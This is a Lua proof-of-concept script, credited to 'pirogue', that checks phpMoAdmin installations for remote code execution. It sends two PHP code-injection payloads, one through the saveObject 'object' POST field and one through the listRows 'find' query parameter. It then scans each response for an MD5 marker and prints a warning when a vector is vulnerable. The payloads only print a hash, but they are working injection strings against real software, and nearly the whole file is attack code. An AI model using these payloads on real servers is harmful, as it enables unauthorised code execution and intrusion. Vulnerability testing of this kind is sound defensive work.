#!/usr/local/bin/lua
-------------------------------------------------------------------------------
-- Name:        phpMoAadmin_rce
-- Author:      pirogue
-- Created:     2016/7/8
-- Site:        http://www.pirogue.org
-- Email:       p1r06u3@gmail.com
-------------------------------------------------------------------------------

local curl = agent.require "lcurl"
agent.load "rex_pcre"
local re = rex_pcre
 

payloads = {
            payload_saveObject_poc = "object=1;print(md5(1));exit",
            --c4ca4238a0b923820dcc509a6f75849b -> 1
            payload_listRows_poc = "?db=admin&action=listRows&collection=zzz&find=array(1);print(md5(2));exit;",
            --c81e728d9d4c2f636f067f89cc14862c -> 2
            }


function phpMoAdmin(url, cookie, payload)
    local response_html = ""
    --local visitable = true
    local headers = {
                        "Accept: text/*",
                        "Cookie:"..cookie,
                    }

    --print (payload)
    local requester = curl.easy()
    requester:setopt_useragent("Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 Qt")
    requester:setopt_httpheader(headers)
    requester:setopt_followlocation(1) -- allow redirection
    requester:setopt(curl.OPT_URL, url)
    requester:setopt(curl.OPT_HEADER, true)
    requester:setopt(curl.OPT_POST, true)
    requester:setopt(curl.OPT_POSTFIELDS,payload)
    requester:setopt(curl.OPT_WRITEFUNCTION, function ( s )
        response_html = response_html..s
        return true
    end)
    requester:setopt(curl.OPT_TIMEOUT, 3)
    local tmp_code, tmp_msg = requester:perform()
    if requester:getinfo(curl.INFO_RESPONSE_CODE) == 200 then
        return response_html
    else 
        print("response_code:"..requester:getinfo(curl.INFO_RESPONSE_CODE))
    end
end

--re the value of md5 in response html
--c4ca4238a0b923820dcc509a6f75849b -> 1 -> object=1;print(md5(1));exit
--c81e728d9d4c2f636f067f89cc14862c -> 2 -> ?db=admin&action=listRows&collection=zzz&find=array(1);print(md5(2));exit;
function find_md5( md5_value )
    if re.match(md5_value,[[c4ca4238a0b923820dcc509a6f75849b]]) then
        print('Warning:The type of saveObject is Vulnerable!')
    end
    if re.match(md5_value,[[c81e728d9d4c2f636f067f89cc14862c]]) then
            print('Warning:The type of listRows is Vulnerable!')
    end
end


function main()
    local res = {}
    local url = "http://127.0.0.1/moadmin.php"
    local cookie = "Qt-Poc-phpMoAdmin_rce"

    if phpMoAdmin(url,cookie,payloads.payload_saveObject_poc) then
        find_md5(phpMoAdmin(url,cookie,payloads.payload_saveObject_poc))
    end

    if phpMoAdmin(url..payloads.payload_listRows_poc,cookie,'') then
        find_md5(phpMoAdmin(url..payloads.payload_listRows_poc,cookie,''))
    end

end

main()
